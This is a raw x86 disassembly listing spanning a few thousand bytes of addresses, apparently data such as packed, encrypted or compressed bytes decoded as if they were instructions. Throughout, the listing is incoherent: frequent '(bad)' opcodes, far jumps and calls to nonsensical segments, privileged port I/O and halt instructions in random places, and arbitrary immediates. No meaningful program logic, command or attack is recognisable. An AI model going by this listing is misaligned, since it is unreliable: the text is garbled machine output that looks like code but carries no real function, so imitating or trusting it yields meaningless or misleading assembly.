  4219a8:	jp     0x4219de
  4219aa:	xor    al,0x7b
  4219ac:	push   eax
  4219ad:	and    DWORD PTR [ebx],eax
  4219af:	mov    al,gs:0x8c77b500
  4219b5:	aam    0x7
  4219b7:	sbb    eax,0x4e3b3523
  4219bc:	xor    BYTE PTR [esi+0x3],al
  4219bf:	jne    0x421a33
  4219c1:	ja     0x421a1a
  4219c3:	xor    BYTE PTR [ecx+eiz*1],al
  4219c6:	scas   eax,DWORD PTR es:[edi]
  4219c7:	xor    eax,eax
  4219c9:	jno    0x421a16
  4219cb:	cmp    ecx,eax
  4219cd:	and    BYTE PTR ds:0x348c595f,0x83
  4219d4:	rcl    DWORD PTR [ecx],0xc
  4219d7:	push   ebx
  4219d8:	inc    eax
  4219d9:	push   eax
  4219da:	dec    edi
  4219db:	jmp    0x7467cfd2
  4219e0:	clc    
  4219e1:	mov    esi,edx
  4219e3:	dec    esp
  4219e4:	add    BYTE PTR [esi-0x20],ch
  4219e7:	ins    DWORD PTR es:[edi],dx
  4219e8:	pop    ebx
  4219e9:	pop    ss
  4219ea:	mov    eax,0x55ed5a59
  4219ef:	les    ebp,FWORD PTR [ecx]
  4219f1:	jg     0x421a66
  4219f3:	add    al,0xb4
  4219f5:	dec    eax
  4219f6:	mov    al,ds:0xf78e3508
  4219fb:	ja     0x421a14
  4219fd:	cli    
  4219fe:	call   eax
  421a00:	and    al,BYTE PTR [ebx+0x8]
  421a03:	mov    dl,BYTE PTR [ebx+0x8]
  421a06:	cmp    dl,al
  421a08:	je     0x421a41
  421a0a:	mov    eax,ds:0x9d568a88
  421a0f:	jo     0x4219b2
  421a11:	mov    WORD PTR [ebp+0x20],gs
  421a14:	outs   dx,DWORD PTR ds:[esi]
  421a15:	jae    0x421a2e
  421a17:	mov    ebx,0x3a75901c
  421a1c:	es jno 0x421a55
  421a1f:	mov    BYTE PTR [edx+esi*8],al
  421a22:	rcl    DWORD PTR [ebx],1
  421a24:	mov    dl,0x31
  421a26:	pop    ebx
  421a27:	dec    DWORD PTR [esi+0x4a]
  421a2a:	pop    ds
  421a2b:	jl     0x421a81
  421a2d:	and    BYTE PTR [edi],bh
  421a2f:	pop    esi
  421a30:	es dec edi
  421a32:	and    al,0xac
  421a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a35:	outs   dx,DWORD PTR ds:[esi]
  421a36:	inc    ecx
  421a37:	lahf   
  421a38:	fcom   DWORD PTR [ecx]
  421a3a:	push   0xded43c0
  421a3f:	jmp    0x8052:0x7c43c585
  421a46:	dec    ebp
  421a47:	mov    ds:0x863e0fe,al
  421a4c:	(bad)  
  421a4d:	sbb    al,0x11
  421a4f:	or     BYTE PTR [ebx+0x8],0x1
  421a53:	fmul   QWORD PTR [ebp-0x267aded7]
  421a59:	push   ebx
  421a5a:	sbb    BYTE PTR [ebp-0x74],dl
  421a5d:	xchg   DWORD PTR [ebp+0x5b1bffbf],esp
  421a63:	lock mov bl,BYTE PTR [esi+0x8]
  421a67:	not    ebx
  421a69:	and    bl,BYTE PTR [esp]
  421a6c:	mov    al,ds:0xc33af2d0
  421a71:	je     0x421ac6
  421a73:	(bad)  
  421a74:	push   esp
  421a75:	(bad)  
  421a76:	xchg   ebp,eax
  421a77:	lock and al,0x43
  421a7a:	adc    DWORD PTR [ebp-0x4bf57ff1],0xfffffffe
  421a81:	adc    BYTE PTR [edi-0x48],dl
  421a84:	pop    es
  421a85:	add    bl,dl
  421a87:	xchg   edx,eax
  421a88:	hlt    
  421a89:	push   eax
  421a8a:	add    bh,BYTE PTR [ebp+0x69]
  421a8d:	push   es
  421a8e:	imul   ecx,DWORD PTR ds:0x416d05c,0x883508fc
  421a98:	(bad)  
  421a99:	ds es sub al,0xa
  421a9d:	mov    edx,0x675a0488
  421aa2:	dec    ebx
  421aa3:	rcl    edi,0x60
  421aa6:	or     DWORD PTR [eax+esi*1],0x20
  421aaa:	pop    eax
  421aab:	in     eax,0x22
  421aad:	addr16 (bad) 
  421aaf:	xchg   esi,eax
  421ab0:	mov    ds:0x98291848,al
  421ab5:	pop    esi
  421ab6:	push   edi
  421ab7:	mov    ecx,0x10cf901a
  421abc:	and    cl,BYTE PTR [eax]
  421abe:	adc    BYTE PTR [eax+ebx*1+0x42835db9],ah
  421ac5:	and    BYTE PTR [edi-0x70],ch
  421ac8:	pop    edi
  421ac9:	adc    al,0xdd
  421acb:	fcmovu st,st(0)
  421acd:	push   edi
  421ace:	test   al,0x25
  421ad0:	mov    al,ds:0x23237b1b
  421ad5:	mov    ebp,ebx
  421ad7:	stos   BYTE PTR es:[edi],al
  421ad8:	test   BYTE PTR [eax-0x5fc4db2e],cl
  421ade:	out    dx,eax
  421adf:	bound  esi,QWORD PTR [eax]
  421ae1:	xor    ebp,esp
  421ae3:	sub    BYTE PTR [edx+0x2],0xa5
  421ae7:	mov    BYTE PTR [edi-0x5b],al
  421aea:	mov    cl,0xe4
  421aec:	call   0xb7c2:0x77014b28
  421af3:	mov    ebx,0x66fbf879
  421af8:	mov    DWORD PTR [ebp+0x1003000f],0x3d08fbfa
  421b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b03:	mov    cl,0xba
  421b05:	dec    esi
  421b06:	push   cs
  421b07:	mov    ecx,0x612b0801
  421b0c:	push   eax
  421b0d:	dec    ebp
  421b0e:	jns    0x421a98
  421b10:	xchg   ebx,eax
  421b11:	push   ebx
  421b12:	jmp    0x421acc
  421b14:	push   edi
  421b15:	test   eax,0x16286a37
  421b1a:	mov    esi,0x48a7a225
  421b1f:	(bad)  
  421b21:	call   0xce6f23d2
  421b26:	mov    WORD PTR [edx-0x57af8451],cs
  421b2c:	cvtdq2ps xmm0,XMMWORD PTR [eax]
  421b2f:	cmp    al,0x3d
  421b31:	pop    eax
  421b32:	cmp    DWORD PTR [ebp-0x3d531ce8],0xc0b2ba
  421b3c:	xor    al,0x4c
  421b3e:	ds push ss
  421b40:	push   cs
  421b41:	cmovnp esp,DWORD PTR [ebx+0x22]
  421b45:	add    dl,BYTE PTR [eax-0x10]
  421b48:	(bad)  
  421b49:	sbb    edx,eax
  421b4b:	inc    edi
  421b4c:	inc    edx
  421b4d:	std    
  421b4e:	lea    eax,[ebp+eax*4-0x725b8020]
  421b55:	sub    eax,0x53076e20
  421b5a:	cmp    ebp,DWORD PTR [edx+0x1c]
  421b5d:	mov    dl,0x69
  421b5f:	(bad)  
  421b60:	pop    ecx
  421b61:	cs daa 
  421b63:	jmp    0x421b83
  421b65:	addr16 fsubr st(7),st
  421b68:	mov    WORD PTR [ebx],ss
  421b6a:	dec    eax
  421b6b:	shl    BYTE PTR [esi+0x8],cl
  421b6e:	add    eax,DWORD PTR [ecx+0x641b8135]
  421b74:	sub    edx,DWORD PTR [ecx-0x3b33e218]
  421b7a:	ja     0x421bec
  421b7c:	(bad)  
  421b7d:	icebp  
  421b7e:	push   edi
  421b7f:	and    BYTE PTR [edi+0xfa84806],bl
  421b85:	hlt    
  421b86:	mov    eax,ds:0x245f5628
  421b8b:	mov    eax,0x2034bc96
  421b90:	bound  edi,QWORD PTR [eax]
  421b92:	enter  0x3a99,0xdc
  421b96:	or     eax,0x597c005e
  421b9b:	and    bh,BYTE PTR [esi]
  421b9d:	sub    eax,0x6dd9ea19
  421ba2:	aaa    
  421ba3:	dec    ecx
  421ba4:	xlat   BYTE PTR ds:[ebx]
  421ba5:	sub    al,0x0
  421ba7:	fisub  WORD PTR [ebx]
  421ba9:	in     al,0x33
  421bab:	ins    DWORD PTR es:[edi],dx
  421bac:	cmp    ch,dh
  421bae:	cmp    BYTE PTR [ecx-0x74d7cc92],cl
  421bb4:	inc    ecx
  421bb5:	xor    al,0x50
  421bb7:	jp     0x421b5e
  421bb9:	into   
  421bba:	sub    DWORD PTR [eax+eax*2],esp
  421bbd:	sub    edi,edi
  421bbf:	dec    ebp
  421bc0:	push   ss
  421bc1:	pushf  
  421bc2:	arpl   WORD PTR [edi+0x32],bx
  421bc5:	push   DWORD PTR [ebp-0x56]
  421bc8:	dec    ebx
  421bc9:	imul   ebx,DWORD PTR [ecx],0xa148d2ac
  421bcf:	icebp  
  421bd0:	aaa    
  421bd1:	pop    ebp
  421bd2:	dec    esi
  421bd3:	loopne 0x421bdf
  421bd5:	jg     0x421bdb
  421bd7:	rcr    DWORD PTR [eax],0x2f
  421bda:	jns    0x421c20
  421bdc:	jl     0x421bbf
  421bde:	retf   0x3904
  421be1:	inc    eax
  421be2:	pop    esp
  421be3:	mov    bh,0xe3
  421be5:	jge    0x421bfa
  421be7:	into   
  421be8:	push   eax
  421be9:	adc    eax,0xb03017bd
  421bee:	xlat   BYTE PTR ds:[ebx]
  421bef:	les    esp,FWORD PTR [eax+0x6c]
  421bf2:	push   0xffffffff
  421bf4:	xor    DWORD PTR [eax-0x63],edi
  421bf7:	popa   
  421bf8:	popfw  
  421bfa:	or     eax,0x259b8604
  421bff:	test   al,0x2b
  421c01:	xor    BYTE PTR [edi-0x27f9f720],cl
  421c07:	sbb    DWORD PTR [ebx+edx*4+0xb],esi
  421c0b:	cmp    DWORD PTR [esi+0x40],edx
  421c0e:	dec    ebx
  421c0f:	sub    bh,ah
  421c11:	push   edi
  421c12:	std    
  421c13:	push   ebp
  421c14:	or     DWORD PTR [ebx],edi
  421c16:	jno    0x421c86
  421c18:	pop    edx
  421c19:	or     DWORD PTR [eax-0x5d],0x7dc28884
  421c20:	jnp    0x421c96
  421c22:	sub    eax,0x942cb8e8
  421c27:	daa    
  421c28:	test   ebx,ebx
  421c2a:	into   
  421c2b:	arpl   WORD PTR [eax+ebp*2-0x5d],si
  421c2f:	jl     0x421c67
  421c31:	mov    edi,0xf6c4dea
  421c36:	enter  0x1b3,0x7b
  421c3a:	mul    DWORD PTR [edi]
  421c3c:	pop    edi
  421c3d:	add    DWORD PTR ds:0x5f1fe9f8,0x54
  421c44:	adc    eax,0xed889360
  421c49:	aas    
  421c4a:	add    al,0x8a
  421c4c:	pop    esp
  421c4d:	and    al,0x34
  421c4f:	push   esi
  421c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c51:	fimul  WORD PTR [edi]
  421c53:	neg    DWORD PTR [edx+eax*8]
  421c56:	cmp    BYTE PTR [edi],ah
  421c58:	push   0x48
  421c5a:	mov    eax,ds:0xf982add
  421c5f:	inc    DWORD PTR [ecx]
  421c61:	ins    BYTE PTR es:[edi],dx
  421c62:	enter  0xd8f7,0xa3
  421c66:	cwde   
  421c67:	push   ebx
  421c68:	call   0x402d:0x7c095854
  421c6f:	retf   
  421c70:	aaa    
  421c71:	in     al,dx
  421c72:	sub    DWORD PTR [edi+esi*2-0x78],eax
  421c76:	cmp    edi,0x3e
  421c79:	sub    al,0x80
  421c7b:	jne    0x421ca7
  421c7d:	mov    esi,0x10bf8cec
  421c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c83:	add    al,ah
  421c85:	push   ds
  421c86:	nop
  421c87:	arpl   WORD PTR [edi+0x9],si
  421c8a:	mov    BYTE PTR ds:0x82fa0a9e,bl
  421c90:	(bad)  
  421c91:	jnp    0x421ca2
  421c93:	jb     0x20b49f05
  421c99:	sub    BYTE PTR [edi-0x7d],0x53
  421c9d:	sbb    DWORD PTR [edx+0x62],0xffffff83
  421ca1:	dec    esi
  421ca2:	dec    eax
  421ca3:	cmp    al,BYTE PTR [ebp+0x778506ea]
  421ca9:	aas    
  421caa:	and    BYTE PTR [edi+0x4d],dh
  421cad:	dec    eax
  421cae:	jo     0x421d03
  421cb0:	nop
  421cb1:	dec    esi
  421cb2:	mov    eax,0xc8086a12
  421cb7:	hlt    
  421cb8:	lock jne 0x421ccf
  421cbb:	mov    eax,ds:0x676fa146
  421cc0:	adc    BYTE PTR [eax+0x1f],0x20
  421cc4:	mov    bh,0x2a
  421cc6:	shl    BYTE PTR [ebp+0x12],1
  421cc9:	or     eax,DWORD PTR [edx+0x5d]
  421ccc:	push   esi
  421ccd:	ja     0x421d1f
  421ccf:	pop    ds
  421cd0:	and    al,0x16
  421cd2:	pop    ds
  421cd3:	cmp    ah,BYTE PTR [eax+0x46]
  421cd6:	frstor [ebx-0x330c8f5]
  421cdc:	lahf   
  421cdd:	mov    eax,0x7856b1c7
  421ce2:	leave  
  421ce3:	and    DWORD PTR [ebx],edi
  421ce5:	mov    eax,DWORD PTR [eax]
  421ce7:	push   edx
  421ce8:	fnstenv [eax]
  421cea:	inc    ecx
  421ceb:	fisttp DWORD PTR [ebp+0x28]
  421cee:	cmp    bl,BYTE PTR [ebx-0x35]
  421cf1:	or     eax,0x4fba07d2
  421cf6:	jo     0x421ce4
  421cf8:	pop    es
  421cf9:	out    dx,eax
  421cfa:	mov    al,ds:0x83a7e390
  421cff:	sbb    eax,eax
  421d01:	jmp    0x421d52
  421d03:	lods   eax,DWORD PTR ds:[esi]
  421d04:	enter  0x9668,0x96
  421d08:	mov    edi,0x714214fe
  421d0d:	enter  0x3c1d,0x80
  421d11:	xor    BYTE PTR [esi-0x62],dl
  421d14:	xor    ch,ah
  421d16:	mov    ebx,0xa101d8f5
  421d1b:	and    al,0x56
  421d1d:	adc    esp,DWORD PTR [eax]
  421d1f:	mov    cl,0x43
  421d21:	fimul  DWORD PTR [ebx]
  421d23:	out    0x27,al
  421d25:	xor    BYTE PTR [eax],ch
  421d27:	aam    0x59
  421d29:	push   cs
  421d2a:	cmp    esp,esp
  421d2c:	fmul   st,st(0)
  421d2e:	adc    ecx,esp
  421d30:	sar    BYTE PTR [esp+ebp*1+0x0],1
  421d34:	(bad)  
  421d35:	je     0x421d42
  421d37:	cmp    BYTE PTR [eax-0x68],ch
  421d3a:	test   eax,0x261f5814
  421d3f:	sti    
  421d40:	sbb    BYTE PTR [eax+0x12485560],bh
  421d46:	ror    BYTE PTR [edx+ebx*4],cl
  421d49:	lods   al,BYTE PTR ds:[esi]
  421d4a:	dec    esp
  421d4b:	cli    
  421d4c:	(bad)  
  421d4d:	sub    BYTE PTR [edx+eax*2],dh
  421d50:	push   cs
  421d51:	mov    bl,0x12
  421d53:	inc    edi
  421d54:	and    al,0x3c
  421d56:	shl    DWORD PTR [edi-0x117b3e60],1
  421d5c:	in     eax,dx
  421d5d:	test   DWORD PTR [eax],0x293b1c87
  421d63:	or     al,0xd1
  421d65:	mov    eax,0xb9f665b8
  421d6a:	adc    eax,0x88a35007
  421d70:	push   0x5
  421d72:	pop    ss
  421d73:	mov    WORD PTR [esi+esi*2-0x59],es
  421d77:	dec    eax
  421d78:	or     eax,0x7f006821
  421d7d:	xor    ch,0x78
  421d80:	test   BYTE PTR [edi-0x6b5c2f09],dh
  421d86:	jae    0x421d22
  421d88:	mov    BYTE PTR [esi-0x47],ah
  421d8b:	sub    al,0xf4
  421d8d:	inc    eax
  421d8e:	sub    DWORD PTR [edx-0x66],eax
  421d91:	rcl    DWORD PTR [edi-0x205c636f],0x28
  421d98:	adc    dl,dh
  421d9a:	popf   
  421d9b:	add    DWORD PTR [esp+ecx*8-0x30],esp
  421d9f:	and    ah,bh
  421da1:	cmp    DWORD PTR [ebx],edi
  421da3:	sub    al,0x6e
  421da5:	std    
  421da6:	sub    dl,BYTE PTR [ebx+eiz*4-0x28]
  421daa:	imul   ebx,DWORD PTR [esi+0x1ddb3f21],0x12
  421db1:	lods   eax,DWORD PTR ds:[esi]
  421db2:	mov    ecx,0xba082e68
  421db7:	js     0x421d5a
  421db9:	or     al,0x29
  421dbb:	in     al,0xf9
  421dbd:	inc    BYTE PTR [eax+0x6b]
  421dc0:	mov    al,0xb9
  421dc2:	cmp    al,0x30
  421dc4:	es dec esp
  421dc6:	xor    BYTE PTR [edx+ebx*1],ah
  421dc9:	and    al,0x20
  421dcb:	adc    al,0x3e
  421dcd:	pusha  
  421dce:	js     0x421dcf
  421dd0:	(bad)  
  421dd1:	jmp    FWORD PTR [edi+0x22]
  421dd4:	and    al,BYTE PTR [eax]
  421dd6:	add    bh,BYTE PTR ds:0x2d062110
  421ddc:	pop    ss
  421ddd:	xor    al,0x2d
  421ddf:	cmp    BYTE PTR ds:0x6d29312e,ch
  421de5:	ins    BYTE PTR es:[edi],dx
  421de6:	imul   ebp,DWORD PTR [edx+0x69],0x69
  421dea:	sbb    BYTE PTR [edi],cl
  421dec:	push   ds
  421ded:	sbb    ch,BYTE PTR [edx]
  421def:	(bad)  
  421df0:	(bad)  
  421df1:	(bad)  
  421df2:	(bad)  
  421df3:	cmp    al,0x6
  421df5:	imul   ecx,DWORD PTR [edx],0x7a742c20
  421dfb:	jae    0x421e1d
  421dfd:	sbb    BYTE PTR [ebp+0x76],dh
  421e00:	pop    ds
  421e01:	add    esi,DWORD PTR [ebx]
  421e03:	xor    DWORD PTR [eax],esi
  421e05:	add    eax,0x516b767d
  421e0a:	or     BYTE PTR [edi+0x4c],dl
  421e0d:	push   esp
  421e0e:	movq   QWORD PTR [edx+0x51],mm7
  421e12:	or     bh,bh
  421e14:	(bad)  
  421e15:	(bad)  
  421e16:	push   DWORD PTR [edi+0x66]
  421e19:	push   esi
  421e1a:	pop    ebp
  421e1b:	push   edi
  421e1c:	bound  ecx,QWORD PTR [ecx+0x13]
  421e1f:	outs   dx,DWORD PTR ds:[esi]
  421e20:	dec    eax
  421e21:	dec    ebp
  421e22:	push   ss
  421e23:	jb     0x421e95
  421e25:	inc    ebx
  421e26:	popa   
  421e27:	dec    ebp
  421e28:	adc    eax,0x572c5e16
  421e2d:	jp     0x421e89
  421e2f:	sub    bh,BYTE PTR [ebp+0x56]
  421e32:	inc    eax
  421e33:	inc    ecx
  421e34:	ins    BYTE PTR es:[edi],dx
  421e35:	and    al,0x21
  421e37:	(bad)  
  421e38:	(bad)  
  421e3a:	dec    DWORD PTR [ebx+0x5a]
  421e3d:	pop    esi
  421e3e:	jle    0x421e9e
  421e40:	xor    eax,0x39493e65
  421e45:	cmp    BYTE PTR [edi],dh
  421e47:	ss cmp eax,0x4397e6e
  421e4d:	pop    ebp
  421e4e:	pop    edi
  421e4f:	push   ebx
  421e50:	add    ebx,DWORD PTR [ecx+0x31]
  421e53:	or     dl,BYTE PTR [edi+eiz*1+0x23]
  421e57:	push   edx
  421e58:	ins    BYTE PTR es:[edi],dx
  421e59:	or     dh,bh
  421e5b:	(bad)  
  421e5c:	cmp    ebx,DWORD PTR [eax+0x28]
  421e5f:	or     DWORD PTR [ebx+ebp*2],eax
  421e62:	adc    al,0xf
  421e64:	sub    al,0x1e
  421e66:	ss sbb BYTE PTR ss:[ebx],al
  421e6a:	adc    ecx,DWORD PTR [edx+edi*8]
  421e6d:	(bad)  
  421e6e:	jmp    FWORD PTR [ebx+0x213d1d32]
  421e74:	jae    0x421e9e
  421e76:	jl     0x421eb5
  421e78:	jg     0x421ea6
  421e7a:	jo     0x421eeb
  421e7c:	jnp    0x421ea6
  421e7e:	jno    0x421e86
  421e80:	(bad)  
  421e82:	or     BYTE PTR [edi],dl
  421e84:	add    edx,DWORD PTR [eax+0x7e]
  421e87:	ins    DWORD PTR es:[edi],dx
  421e88:	(bad)  
  421e89:	(bad)  
  421e8a:	jmp    FWORD PTR [edi+0xb437910]
  421e90:	pop    eax
  421e91:	jbe    0x421ef9
  421e93:	pop    ss
  421e94:	dec    esp
  421e95:	popa   
  421e96:	push   esp
  421e97:	adc    eax,DWORD PTR [eax+0x1c]
  421e9a:	add    edx,DWORD PTR [edi]
  421e9c:	bound  edx,QWORD PTR [eax]
  421e9e:	push   ebx
  421e9f:	sbb    ecx,DWORD PTR [eax+0x66]
  421ea2:	push   ss
  421ea3:	sub    edi,DWORD PTR [ecx+0x28]
  421ea6:	ins    DWORD PTR es:[edi],dx
  421ea7:	jg     0x421ecc
  421ea9:	jmp    0x421eaa
  421eab:	(bad)  
  421eac:	(bad)  
  421ead:	jnp    0x421f0e
  421eaf:	jle    0x421ef3
  421eb1:	and    BYTE PTR [edx+0x23],ah
  421eb4:	and    ah,BYTE PTR [ecx]
  421eb6:	and    BYTE PTR [edi],bh
  421eb8:	cmp    al,0x4f
  421eba:	pop    ecx
  421ebb:	cmp    DWORD PTR [edx],edi
  421ebd:	cmp    bl,BYTE PTR [esi+0x51]
  421ec0:	pop    edi
  421ec1:	inc    edi
  421ec2:	dec    esi
  421ec3:	push   esi
  421ec4:	dec    eax
  421ec5:	xor    BYTE PTR [ebx],bl
  421ec7:	sub    bh,ch
  421ec9:	(bad)  
  421eca:	(bad)  
  421ecb:	inc    esi
  421ecd:	add    dl,BYTE PTR es:[ebx]
  421ed0:	push   ebp
  421ed1:	push   ebp
  421ed2:	and    BYTE PTR [ecx],dl
  421ed4:	dec    ecx
  421ed5:	pop    ecx
  421ed6:	add    eax,0x283c1b1a
  421edb:	femms  
  421edd:	adc    esi,DWORD PTR [edi]
  421edf:	push   ss
  421ee0:	sbb    al,0x2
  421ee2:	pop    ss
  421ee3:	and    al,0x18
  421ee5:	add    eax,0xff0a3d26
  421eea:	(bad)  
  421eeb:	push   DWORD PTR [edi-0x26]
  421eee:	push   cs
  421eef:	jnp    0x421f2a
  421ef1:	add    esi,DWORD PTR cs:[edx]
  421ef4:	xor    DWORD PTR [edi],ecx
  421ef6:	sub    bl,BYTE PTR [ebx]
  421ef8:	xor    esi,DWORD PTR [eax+0x5e]
  421efb:	push   cs
  421efc:	dec    edi
  421efd:	jb     0x421f4d
  421eff:	arpl   WORD PTR [eax+0x4c],cx
  421f02:	push   esi
  421f03:	push   es
  421f04:	dec    esp
  421f05:	push   ebp
  421f06:	add    BYTE PTR [ebx+0x7c],al
  421f09:	(bad)  
  421f0a:	(bad)  
  421f0b:	(bad)  
  421f0d:	popa   
  421f0e:	ins    DWORD PTR es:[edi],dx
  421f0f:	sbb    cl,BYTE PTR [esi+0x7d]
  421f12:	sbb    BYTE PTR [edi-0x6],al
  421f15:	gs popa 
  421f17:	adc    al,0x49
  421f19:	adc    BYTE PTR [edx+0x77],ch
  421f1c:	ja     0x421f77
  421f1e:	je     0x421f87
  421f20:	pop    esi
  421f21:	sub    ch,BYTE PTR [edi+0x4e]
  421f24:	and    BYTE PTR [ebx+edi*2],ah
  421f27:	jo     0x421fa6
  421f29:	jle    0x421f2a
  421f2b:	(bad)  
  421f2c:	(bad)  
  421f2d:	jmp    DWORD PTR [edx]
  421f2f:	gs pop esi
  421f31:	jp     0x421f8a
  421f33:	inc    ebx
  421f34:	inc    edx
  421f35:	pop    esp
  421f36:	jge    0x421f9c
  421f38:	pop    edx
  421f39:	sub    BYTE PTR [esi+0x50],cl
  421f3c:	dec    esp
  421f3d:	inc    edx
  421f3e:	push   esi
  421f3f:	push   eax
  421f40:	sub    BYTE PTR [ebx+0x24],bl
  421f43:	cmp    bl,BYTE PTR [eax+eax*1]
  421f46:	push   es
  421f47:	push   es
  421f48:	sub    ecx,DWORD PTR [ecx]
  421f4a:	and    BYTE PTR ss:[edx],dh
  421f4d:	push   esp
  421f4e:	fistp  QWORD PTR [ecx+edi*4+0x141107e0]
  421f55:	mov    dh,0xa
  421f57:	cmp    al,0x2b
  421f59:	sbb    esi,DWORD PTR [eax]
  421f5b:	pop    es
  421f5c:	cmp    dh,BYTE PTR [edi]
  421f5e:	cmp    al,0x79
  421f60:	jnp    0x421f66
  421f62:	(bad)  
  421f63:	(bad)  
  421f64:	(bad)  
  421f65:	call   FWORD PTR [edx]
  421f67:	and    al,0x20
  421f69:	es or  ebp,DWORD PTR es:[edi]
  421f6d:	add    edx,DWORD PTR [eax]
  421f6f:	adc    dh,BYTE PTR [ecx+ebp*1+0x9]
  421f73:	adc    DWORD PTR [ebx],ecx
  421f75:	je     0x421fe0
  421f77:	packsswb mm2,QWORD PTR [esi+0x56]
  421f7b:	jnp    0x421fd3
  421f7d:	js     0x421fd9
  421f7f:	bound  eax,QWORD PTR [esi+edx*2]
  421f82:	pop    esp
  421f83:	dec    edx
  421f84:	sbb    esp,DWORD PTR [edi+esi*1-0x44]
  421f88:	loope  0x421f89
  421f8a:	jns    0x421f9e
  421f8c:	sbb    DWORD PTR [eax],ebx
  421f8e:	push   ebp
  421f8f:	push   edx
  421f90:	pop    esp
  421f91:	jae    0x421fed
  421f93:	popa   
  421f94:	adc    esi,DWORD PTR [esi+0x50465e5d]
  421f9a:	cwde   
  421f9b:	push   ebx
  421f9c:	das    
  421f9d:	jl     0x421f5e
  421f9f:	loope  0x421fa0
  421fa1:	add    eax,0x3e2126ac
  421fa6:	pop    esp
  421fa7:	pop    edx
  421fa8:	cmp    al,0x34
  421faa:	bound  ebp,QWORD PTR [eax+0x6f]
  421fad:	cmp    eax,0x34429259
  421fb2:	xor    esi,DWORD PTR [eax]
  421fb4:	inc    ebx
  421fb5:	es pop ss
  421fb7:	loopne 0x421fb8
  421fb9:	(bad)  
  421fba:	cmp    esp,DWORD PTR ds:0x595c5a29
  421fc0:	add    BYTE PTR [esi+0x23],dl
  421fc3:	dec    ebx
  421fc4:	cmp    ecx,DWORD PTR cs:[esi+0x52]
  421fc8:	sbb    eax,0x19150b16
  421fcd:	dec    eax
  421fce:	push   ss
  421fcf:	push   ds
  421fd0:	add    BYTE PTR [eax+ebp*8-0x1],cl
  421fd4:	and    BYTE PTR [edi+0x5c],0x11
  421fd8:	sub    BYTE PTR [edx+0xe],ah
  421fdb:	jl     0x422015
  421fdd:	sbb    ecx,DWORD PTR [eax]
  421fdf:	jnp    0x42200d
  421fe1:	cmp    al,bh
  421fe3:	(bad)  
  421fe4:	(bad)  
  421fe6:	in     al,0x2e
  421fe8:	cli    
  421fe9:	jno    0x422056
  421feb:	push   ebx
  421fec:	je     0x42203e
  421fee:	jnp    0x42206d
  421ff0:	push   eax
  421ff1:	arpl   WORD PTR [ebp+0x1],dx
  421ff4:	jne    0x422042
  421ff6:	pop    ds
  421ff7:	or     esp,DWORD PTR [eax+0x7fffffff]
  421ffd:	pusha  
  421ffe:	sbb    al,0x69
  422000:	sbb    DWORD PTR [edx+0x59],ecx
  422003:	pop    edi
  422004:	push   eax
  422005:	js     0x422019
  422007:	dec    eax
  422008:	push   esp
  422009:	bound  edx,QWORD PTR ds:0x7078726a
  42200f:	jo     0x42208d
  422011:	push   edx
  422012:	and    cl,BYTE PTR [edx+0x4a]
  422015:	dec    eax
  422016:	and    bh,BYTE PTR [ecx+0x76]
  422019:	and    esp,DWORD PTR ds:0xfffff85a
  42201f:	inc    DWORD PTR [edx+0x7a]
  422022:	jle    0x422084
  422024:	ins    BYTE PTR es:[edi],dx
  422025:	inc    edx
  422026:	dec    eax
  422027:	pop    edx
  422028:	pop    edx
  422029:	pop    eax
  42202a:	xor    dh,BYTE PTR [esi+0x49]
  42202d:	dec    esi
  42202e:	xor    eax,0x818524a
  422033:	add    cl,BYTE PTR [edx]
  422035:	and    al,0x2f
  422037:	cmp    ecx,DWORD PTR [esi]
  422039:	ss push eax
  42203b:	adc    eax,0xffffff55
  422040:	scas   eax,DWORD PTR es:[edi]
  422041:	ret    0xb28
  422044:	imul   eax,DWORD PTR ds:0x10143a32,0x8
  42204b:	adc    al,0x6
  42204d:	pusha  
  42204e:	and    eax,0x1867613e
  422053:	sbb    eax,0x2a22030a
  422058:	pop    es
  422059:	cmp    BYTE PTR [edi],al
  42205b:	adc    al,0x16
  42205d:	jo     0x422040
  42205f:	fcomip st,st(0)
  422061:	jmp    FWORD PTR [esi]
  422063:	push   cs
  422064:	es ja  0x42206f
  422067:	ins    DWORD PTR es:[edi],dx
  422068:	outs   dx,BYTE PTR ds:[esi]
  422069:	dec    esp
  42206a:	push   edx
  42206b:	pop    edx
  42206c:	ja     0x4220bb
  42206e:	mov    ds:0x55f0066,al
  422073:	sbb    eax,0xc37d7807
  422078:	neg    bh
  42207a:	mov    al,0x3e
  42207c:	inc    edx
  42207d:	dec    edx
  42207e:	js     0x4220e3
  422080:	pop    esi
  422081:	jbe    0x422093
  422083:	dec    edi
  422084:	push   eax
  422085:	inc    esi
  422086:	pop    ss
  422087:	push   0x7a727632
  42208c:	(bad)  
  42208d:	(bad)  
  42208e:	in     eax,dx
  42208f:	push   es
  422090:	aam    0x6e
  422092:	inc    esi
  422093:	and    dl,dh
  422095:	bound  esp,QWORD PTR [edi]
  422097:	pop    eax
  422098:	pop    ebp
  422099:	je     0x42210a
  42209b:	bound  ebp,QWORD PTR [edx+0x44]
  42209e:	cmp    DWORD PTR [edx+0x7e],eax
  4220a1:	push   esi
  4220a2:	xor    BYTE PTR [ecx+0x4e],ch
  4220a5:	inc    eax
  4220a6:	(bad)  
  4220a7:	inc    DWORD PTR [esi+0x3e2637ff]
  4220ad:	push   ebp
  4220ae:	or     al,0x4
  4220b0:	or     BYTE PTR [esi],ah
  4220b2:	push   esp
  4220b3:	jbe    0x4220e9
  4220b5:	push   esi
  4220b6:	or     al,0x57
  4220b8:	imul   edx,DWORD PTR es:[esi],0x342a100e
  4220bf:	cmp    BYTE PTR [esi],dl
  4220c1:	popa   
  4220c2:	ins    WORD PTR es:[edi],dx
  4220c4:	adc    eax,0x26ffffff
  4220c9:	data16 cmp al,0x23
  4220cc:	bound  ecx,QWORD PTR ds:0xc141b06
  4220d2:	cmp    eax,DWORD PTR gs:[esi]
  4220d5:	adc    BYTE PTR [edi],bl
  4220d7:	push   ss
  4220d8:	add    DWORD PTR [edi],eax
  4220da:	or     dl,BYTE PTR [ebx]
  4220dc:	add    al,0x78
  4220de:	addr16 dec esp
  4220e0:	outs   dx,BYTE PTR ds:[esi]
  4220e1:	jno    0x4220e2
  4220e3:	jmp    FWORD PTR [edi+0x7b427ff8]
  4220e9:	inc    ebx
  4220ea:	or     eax,0x5a094074
  4220ef:	sbb    dl,BYTE PTR [ebp+edx*1+0x45]
  4220f3:	ins    BYTE PTR es:[edi],dx
  4220f4:	jb     0x422173
